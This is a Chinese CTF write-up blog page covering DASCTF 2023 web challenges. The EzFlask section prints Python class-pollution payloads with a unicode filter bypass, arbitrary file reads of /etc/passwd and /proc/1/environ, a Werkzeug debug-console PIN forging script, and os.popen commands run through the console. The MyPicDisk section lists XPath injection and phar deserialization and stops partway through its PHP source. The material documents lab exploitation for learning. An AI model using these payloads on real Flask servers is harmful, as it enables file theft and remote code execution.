-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> alerted = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">const</span> observer = <span class="keyword">new</span> <span class="title class_">MutationObserver</span>(<span class="function">(<span class="params">mutations</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (alerted) <span class="keyword">return</span>;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;Looks like you&#x27;re getting somewhere!&quot;</span>);   <span class="comment">//</span></span><br><span class="line">  alerted = <span class="literal">true</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Configure the observer with options</span></span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  <span class="attr">childList</span>: <span class="literal">true</span>, <span class="comment">// observe child node additions/deletions</span></span><br><span class="line">  <span class="attr">subtree</span>: <span class="literal">true</span>, <span class="comment">// observe changes in all descendant nodes</span></span><br><span class="line">  <span class="attr">attributes</span>: <span class="literal">true</span>, <span class="comment">// observe attribute changes</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;load&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// Attach the observer to a DOM element</span></span><br><span class="line">  <span class="keyword">const</span> targetNode = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#myElement&quot;</span>);</span><br><span class="line">  observer.<span class="title function_">observe</span>(targetNode, options);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">(<span class="string">&quot;big hints: headless browser with your file&quot;</span>);   </span><br><span class="line">(<span class="string">&quot;gets flag from server&quot;</span>);                        </span><br><span class="line">(<span class="string">&quot;what can you do to intercept this?&quot;</span>);           </span><br></pre></td></tr></table></figure>
-
-<p>这题是一个js审计问题，第一次遇见，看WP复现出来的</p>
-<p>去网上看了看发现自己还很不了了解js相关的漏洞</p>
-<p>根据hint：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&quot;big hints: headless browser with your file&quot;</span>);   </span><br><span class="line">(<span class="string">&quot;gets flag from server&quot;</span>);                        </span><br><span class="line">(<span class="string">&quot;what can you do to intercept this?&quot;</span>);    </span><br></pre></td></tr></table></figure>
-
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-DASCTF 2023 &amp; 0X401七月暑期挑战赛" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/08/28/DASCTF%202023%20&%200X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/" class="article-date">
-      <time datetime="2023-08-28T05:11:37.986Z" itemprop="datePublished">2023-08-28</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: DASCTF 2023 &amp; 0X401七月暑期挑战赛-WEB Writeup</span><br><span class="line">date: 2023-08-25 00:49:55</span><br><span class="line">tags: CTF</span><br></pre></td></tr></table></figure>
-
-<h1 id="DASCTF-2023-0X401七月暑期挑战赛-WEB-Writeup"><a href="#DASCTF-2023-0X401七月暑期挑战赛-WEB-Writeup" class="headerlink" title="DASCTF 2023 &amp; 0X401七月暑期挑战赛-WEB Writeup"></a>DASCTF 2023 &amp; 0X401七月暑期挑战赛-WEB Writeup</h1><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure>
-
-<p>这题关键点在函数 <strong>merge</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure>
-
-<p>这个函数是一个熟悉的原型链污染函数</p>
-<p>然后没有见过python原型链污染，所以学习开始</p>
-<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1876/">https://tttang.com/archive/1876/</a></p>
-<p>然后污染__file__实现任意文件读取</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br></pre></td></tr></table></figure>
-
-<p>测试一下污染：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">user = user()</span><br><span class="line"><span class="built_in">print</span>(user.__init__.__globals__[<span class="string">&#x27;__file__&#x27;</span>])</span><br><span class="line">payload= &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span> : <span class="string">&quot;fuck&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> : <span class="string">&quot;you&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> :&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;__file__&quot;</span>:<span class="string">&quot;this is test&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">merge(payload,user)</span><br><span class="line"><span class="built_in">print</span>(user.__init__.__globals__[<span class="string">&#x27;__file__&#x27;</span>])</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Harder\PycharmProjects\Script\main.py</span><br><span class="line">this is test</span><br><span class="line"> * Serving Flask app &#x27;main&#x27;</span><br><span class="line"> * Debug mode: off</span><br></pre></td></tr></table></figure>
-
-<p>first payload:</p>
-<p>发现__init__被过滤了，用unicode编码绕过 _ &#x3D;&#x3D; \u005f</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意改为Content-Type: application/json</span></span><br><span class="line"><span class="comment"># 通过修改__file__实现任意文件读取</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span> : <span class="string">&quot;fuck&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> : <span class="string">&quot;you&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__init_\u005f&quot;</span> :&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;__file__&quot;</span>:<span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>second payload:</p>
-<h5 id="static-url-path"><a href="#static-url-path" class="headerlink" title="_static_url_path"></a><a target="_blank" rel="noopener" href="https://tttang.com/archive/1876/#toc__static_url_path"><code>_static_url_path</code></a></h5><p>这个属性中存放的是<code>flask</code>中静态目录的值，默认该值为<code>static</code>。访问<code>flask</code>下的资源可以采用如<code>http://domain/static/xxx</code>，这样实际上就相当于访问<code>_static_url_path</code>目录下<code>xxx</code>的文件并将该文件内容作为响应内容返回</p>
-<p>__init__被禁止，json识别unicode编码绕过</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意改为Content-Type: application/json</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span> : <span class="string">&quot;fuck&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> : <span class="string">&quot;you&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__init_\u005f&quot;</span> :&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">				<span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;/&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 用/static/xxx下载任意文件</span></span><br></pre></td></tr></table></figure>
-
-<p>然后读取发现处于debug模式想到了写pin码，访问路由console</p>
-<p><img src="C:\Users\Harder\AppData\Roaming\Typora\typora-user-images\image-20230814001826203.png" alt="image-20230814001826203"></p>
-<p>写pin码的exp需要找到对应的版本，网卡地址卡了我半天，然后需要找到对应版本的pin码生成过程</p>
-<p>可以去这个网址看<a target="_blank" rel="noopener" href="https://github.com/pallets/werkzeug/blob/2.0.x/src/werkzeug/debug/__init__.py#L43">https://github.com/pallets/werkzeug/blob/2.0.x/src/werkzeug/debug/__init__.py#L43</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line"><span class="comment"># werkzeug2.0x 高版本</span></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>  <span class="comment"># username   /etc/passwd里面找用户</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname  默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span>       <span class="comment">#etattr(mod, &#x27;__file__&#x27;, None),  报错得到,moddir</span></span><br><span class="line">]</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">private_bits参数一 ：str(uuid.getnode()), 读 /sys/class/net/ens0/address  /sys/class/net/eth0/address  b2:7d:55:14:ad:f1</span></span><br><span class="line"><span class="string">private_bits参数二 ：# 一.get_machine_id(), 读/etc/machine-id  二.读 /proc/self/cgroup</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">a = <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;b2:7d:55:14:ad:f1&quot;</span>.replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;b2:7d:55:14:ad:f1&quot;</span>.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>),<span class="number">16</span>)),</span><br><span class="line">    <span class="string">&#x27;96cec10d3d9307792745ec3b85c89620&#x27;</span>+<span class="string">&#x27;docker-fdcea420d972705e3e38b080e3ae658492f05756c6ed9d786b26b2b1b39d46e5.scope&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 源码里面的</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x: x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
-
-<p>生成pin码：135-940-781</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.popen(<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"><span class="comment"># &#x27;app\nbin\nboot\ndev\netc\nflag123123_is312312312_here3123213\nhome\nl  </span></span><br><span class="line">os.popen(<span class="string">&#x27;cat /flag123123_is312312312_here3123213&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
-
-<p>非预期解：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读环境变量  /proc/1/environ</span><br></pre></td></tr></table></figure>
-
-<p>DASCTF{489d78ce-1068-4b76-b3e9-d0049cff32cc}</p>
-<p>扩展练习：<br> CTFSHOW 801<br> [GYCTF2020]FlaskApp<br> HSCSEC-2TH EZFLASK</p>
-<h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><p>考点：Xpath注入&amp;&amp;文件名注入&amp;&amp;phar反序列化&amp;&amp;</p>
-<p>这里可以万能密码登陆，但是要用BP发包，可以下载 &#x2F;y0u_cant_find_1t.zip源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(0);</span><br><span class="line">class FILE&#123;   //file</span><br><span class="line">    public $filename;</span><br><span class="line">    public $lasttime;</span><br><span class="line">    public $size;</span><br><span class="line">    public function __construct($filename)&#123;</span><br><span class="line">        if (preg_match(&quot;/\//i&quot;, $filename))&#123;</span><br><span class="line">            throw new 